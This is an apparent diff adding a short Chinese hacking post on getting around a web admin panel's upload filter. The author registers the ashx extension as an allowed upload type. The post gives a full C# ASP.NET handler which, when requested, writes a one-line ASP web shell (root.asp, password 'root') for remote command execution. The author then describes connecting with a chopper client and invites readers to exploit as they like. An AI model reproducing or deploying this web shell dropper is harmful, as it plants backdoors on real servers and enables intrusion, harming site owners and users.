@@ -1,0 +1,46 @@
+发现后台可以设置上传类型，但是asp，asa,cer等等都不行，上传之后就提示下载
+
+尝试着关闭了下了，还是不行，后来找到了一位前辈写的文章
+
+过滤了asa,cer,cdx,php,aspx等脚本类型的上传情况下添加一个ashx的上传类型，上传一个ashx脚本上去，
+脚本内容如下：
+
+然后访问上传后的ashx文件，就会在同目录下生成一个root.asp的一句话木马，然后使用一句话木马客户端连接即可。利用方面就大家自由发挥了！
+
+
+密码为root，果断菜刀连之
+
+没有最牛逼的方法，只有最爱思想的脑子
+
+
+*****************
+
+脚本
+
+ashx.txt
+
+
+<%@ WebHandler Language="C#" class="Handler" %>
+
+using System;
+using System.Web;
+using System.IO;
+public class Handler : IHttpHandler {
+
+public void ProcessRequest (HttpContext context) {
+context.Response.ContentType = "text/plain";
+
+StreamWriter file1= File.CreateText(context.Server.MapPath("root.asp"));
+file1.Write("<%response.clear:execute request(\"root\"):response.End%>");
+file1.Flush();
+file1.Close();
+
+}
+
+public bool IsReusable {
+get {
+return false;
+}
+}
+
+}
